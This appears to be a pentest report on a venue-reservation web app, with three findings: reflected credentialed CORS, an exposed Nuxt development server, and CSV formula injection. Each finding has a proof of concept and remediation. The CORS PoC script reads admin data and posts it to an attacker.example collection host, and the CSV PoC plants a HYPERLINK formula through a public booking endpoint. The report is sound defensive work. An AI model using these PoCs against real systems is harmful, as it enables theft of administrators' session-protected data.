title: Reflected credentialed CORS allows cross-origin reads of authenticated admin data
description: The API reflects arbitrary `Origin` values while enabling credentials, allowing a malicious website to read responses from authenticated endpoints when a user is logged in. This permits cross-origin disclosure of administrative venue data.
impact: An attacker can host a page on an arbitrary origin and induce an authenticated administrator or staff user to visit it. The browser sends the `gioi_session` cookie and exposes API responses to attacker-controlled JavaScript, allowing unauthorized reading of data returned by `/admin/venues` and potentially other credentialed endpoints.
technical_analysis: The API accepts an attacker-controlled `Origin` header and responds with the same value in `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`. Browsers therefore permit scripts running on an arbitrary origin to issue credentialed requests and read the authenticated response. No strict origin allowlist was observed for this route.
poc_description:
1. Authenticate to the application as a seeded administrative user and retain the resulting `gioi_session` cookie.
2. From a different origin controlled by the attacker, issue a cross-origin request to `http://host.docker.internal:3001/admin/venues` with `credentials: include`.
3. Observe that the response is readable by the attacker because the API reflects the attacker origin and permits credentials.
4. Compare with an unauthenticated request, which returns `401`, confirming that the disclosed content is protected by the session cookie.
poc_script_code:
```html
<script>
fetch('http://host.docker.internal:3001/admin/venues', {credentials: 'include'})
  .then(response => response.text())
  .then(data => fetch('https://attacker.example/collect', {
    method: 'POST',
    body: data
  }));
</script>
```

```http
GET /admin/venues HTTP/1.1
Host: host.docker.internal:3001
Origin: http://evil.example
Cookie: gioi_session=<authenticated-session>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://evil.example
Access-Control-Allow-Credentials: true
```
remediation_steps: Configure CORS with an explicit allowlist of trusted production origins and reject all other origins. Never reflect the request `Origin` when credentials are enabled. Apply the same policy consistently to preflight and actual responses, and avoid enabling credentialed CORS on administrative endpoints unless it is strictly required.
evidence:
Authenticated request `218` returned venue data with attacker-controlled CORS headers:

```http
Origin: http://evil.example
Cookie: gioi_session=<authenticated-session>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://evil.example
Access-Control-Allow-Credentials: true
```

Unauthenticated baseline request `219` to the same endpoint returned `401`, demonstrating that the readable response requires the authenticated session. Preflight request `524` also completed, confirming the cross-origin flow is permitted.
assumptions: The victim must be logged in and visit an attacker-controlled origin while the session cookie is accepted by the API. The impact is directly exploitable in a browser when the service is reachable from the victim's browser, including an HTTPS deployment using the same cookie scope.
counterevidence: The exploit requires an authenticated victim and browser interaction; an attacker cannot read `/admin/venues` without the victim's session. However, the API explicitly reflects arbitrary origins and enables credentials, and the authenticated response was observed as `200` with venue data, so no effective origin restriction was present on this path.
severity_change_conditions: Confirmation that the same reflected policy covers additional high-sensitivity administrative endpoints or cross-tenant records would raise the impact; restricting the endpoint to a strict trusted-origin allowlist would eliminate the issue.

title: Unauthenticated Nuxt development server exposes application source and Vite internals
description: The frontend on `http://host.docker.internal:3002` is running in Nuxt development mode and serves application source modules and Vite development assets to unauthenticated clients. Attackers can retrieve route, authentication, API, and business-logic source code, along with absolute developer filesystem paths.
impact: An unauthenticated remote attacker can download internal frontend source such as `composables/useApi.ts` and `stores/auth.ts`, enumerate privileged API operations and client-side authorization assumptions, and retrieve the Vite runtime. The disclosure materially lowers the effort required to target the separate API, identify hidden administrative workflows, and chain authorization or object-access weaknesses. Absolute local paths and dependency versions also disclose deployment details.
technical_analysis: The root response identifies a Nuxt development runtime (`x-powered-by: Nuxt`) and embeds module URLs under `/_nuxt/@fs/...` that expose the developer filesystem. The server also exposes `/_nuxt/@vite/client` and accepts direct requests for source modules, including `/_nuxt/composables/useApi.ts` and `/_nuxt/stores/auth.ts`, without authentication. The returned source contains the staff/admin API map and client authentication logic, which should not be available from a production deployment.
poc_description:
1. Send an unauthenticated `GET` request to `/` on port `3002`.
2. Observe a `200` Nuxt development HTML response containing absolute `/Users/.../apps/web` paths and a `/_nuxt/@vite/client` module.
3. Send an unauthenticated `GET` request to `/_nuxt/composables/useApi.ts`.
4. Observe a `200` response containing readable application source and staff/admin API paths.
5. Send an unauthenticated `GET` request to `/_nuxt/stores/auth.ts` to retrieve authentication-store source as an additional control.
poc_script_code:
```python
import requests

base = "http://host.docker.internal:3002"
for path in ("/", "/_nuxt/composables/useApi.ts", "/_nuxt/stores/auth.ts", "/_nuxt/@vite/client"):
    response = requests.get(base + path, timeout=10)
    print(path, response.status_code, len(response.content), response.headers.get("content-type"))
    if path.endswith("useApi.ts"):
        print("staff endpoint disclosed:", "/staff/" in response.text)
        print("admin endpoint disclosed:", "/admin/" in response.text)
```
remediation_steps: Run the Nuxt frontend in a production build (`nuxt build` followed by the production server) for any exposed environment. Bind the Vite/Nuxt development server only to a local interface or a protected development network, and require authentication at the reverse proxy if development access is unavoidable. Disable public access to Vite source modules, `@fs` paths, `@vite/client`, source maps, and HMR endpoints. Review deployment automation so `dev` mode cannot be started in production.
evidence:
Unauthenticated responses captured from the frontend include:

```http
GET / HTTP/1.1
Host: host.docker.internal:3002

HTTP/1.1 200 OK
x-powered-by: Nuxt
content-type: text/html;charset=utf-8
```

The HTML contains absolute source paths and a Vite runtime reference:

```html
<link rel="stylesheet" href="/_nuxt/@fs/Users/heyrcg/Documents/Works/gioi/apps/web/...">
<script type="module" src="/_nuxt/@vite/client"></script>
<script>window.__NUXT__.config={public:{apiBase:"https://gioi-api.vercel.app",...}}</script>
```

Direct unauthenticated source retrieval succeeds:

```http
GET /_nuxt/composables/useApi.ts HTTP/1.1
Host: host.docker.internal:3002

HTTP/1.1 200 OK
content-type: application/javascript

... apiFetch("/staff/me") ...
... apiFetch("/admin/audit-log") ...
```

`/_nuxt/stores/auth.ts` also returns `200`, while `/_nuxt/@vite/client` returns approximately 180 KB of Vite development runtime.
assumptions: The frontend is reachable by an attacker who can connect to port `3002`; no authentication or network restriction is applied before these asset requests.
counterevidence: Some frontend JavaScript is necessarily delivered to every browser, and the exposed modules do not themselves contain a confirmed secret. However, the response is not a normal production bundle: it serves raw TypeScript/Vue modules, Vite HMR runtime code, absolute developer paths, and internal source files directly. No authentication, reverse-proxy restriction, or production-build control was observed on the tested paths.
severity_change_conditions: Confirmation that the same development server is internet-reachable or contains source-level secrets would raise the impact; restricting port 3002 to a trusted development network and serving only a production build would lower it.

title: CSV Formula Injection in Admin Venue Reservation Export
description: The public reservation endpoint accepts guest names beginning with spreadsheet formula syntax, and the admin venue CSV export emits that value without neutralization. An administrator opening the downloaded CSV in a spreadsheet can trigger the injected formula, enabling phishing or outbound navigation from the administrative workstation.
impact: An unauthenticated user can persist a formula in a reservation and have it delivered to administrators through `/admin/venues/{venueId}/export.csv`. When opened by a spreadsheet application, the `HYPERLINK` formula is interpreted rather than treated as text, allowing attacker-controlled navigation and potentially other spreadsheet actions depending on the client and formula payload.
technical_analysis: `POST /public/venues/bali/reservations` stores `guestName` beginning with `=HYPERLINK(...)`. The authenticated export endpoint serializes the stored value as a quoted CSV field (`"=HYPERLINK(...)"`) but does not prepend a single quote or otherwise neutralize formula-leading characters. CSV quoting only escapes delimiters and does not prevent spreadsheet formula evaluation.
poc_description:
1. Submit a reservation to the public Bali venue endpoint with `guestName` set to `=HYPERLINK("http://x","x")` and valid reservation details.
2. Authenticate as the seeded administrator and request `/admin/venues/01a1b416-566e-7288-9725-6c2b92ad2bed/export.csv`.
3. Locate the created booking code `GIOI-V93TGH7M` in the CSV and open the file in a spreadsheet application.
4. Observe that the `guest_name` cell begins with an executable `HYPERLINK` formula instead of literal text.
poc_script_code:
```python
import requests

base = "http://host.docker.internal:3001"
s = requests.Session()

reservation = {
    "date": "2026-11-15",
    "time": "19:00",
    "partySize": 2,
    "guestName": '=HYPERLINK("http://x","x")',
    "phone": "0812345678",
    "email": "x@example.com",
}
r = s.post(f"{base}/public/venues/bali/reservations", json=reservation)
r.raise_for_status()
print(r.json())

login = s.post(f"{base}/staff/login", json={"username": "admin", "password": "password"})
login.raise_for_status()
export = s.get(f"{base}/admin/venues/01a1b416-566e-7288-9725-6c2b92ad2bed/export.csv")
export.raise_for_status()
assert '=HYPERLINK(""http://x"",""x"")' in export.text
print("formula present in exported CSV")
```
remediation_steps: Neutralize spreadsheet formula prefixes in every exported cell derived from user-controlled data. Before CSV serialization, prefix values whose first non- whitespace character is one of `=`, `+`, `-`, or `@` with a single quote (or use an equivalent proven CSV-injection mitigation), while preserving CSV quoting. Apply the same policy to all export fields and add regression tests covering formula prefixes and leading whitespace.
evidence:
The attacker-controlled public request was accepted:

```http
POST /public/venues/bali/reservations HTTP/1.1
Content-Type: application/json

{"date":"2026-11-15","time":"19:00","partySize":2,"guestName":"=HYPERLINK(\"http://x\",\"x\")","phone":"0812345678","email":"x@example.com"}
```

The API returned booking code `GIOI-V93TGH7M`. The authenticated export response contained the same value as an executable formula:

```csv
01a1c306-4313-7658-b568-0754538f9953,GIOI-V93TGH7M,"=HYPERLINK(""http://x"",""x"")",0812345678,x@example.com,2,2026-11-15,19:00,pending,,
```
assumptions: The administrator or staff member opens the downloaded CSV in a spreadsheet application that evaluates formulas. The demonstrated payload uses only the documented public reservation flow and does not require an attacker account.
counterevidence: The export endpoint requires an authenticated administrator, and CSV fields are correctly quoted for delimiter safety. Those controls do not neutralize formula-leading content: the reservation is created anonymously and the exported field still starts with `=`, which spreadsheet clients interpret as a formula. The PoC demonstrates persistence and delivery; execution depends on the normal administrative workflow of opening the export.
severity_change_conditions: Confirmation that exported files are automatically opened or processed by a spreadsheet client without warning would raise impact; confirmed formula execution that exfiltrates protected data would raise confidentiality and severity.
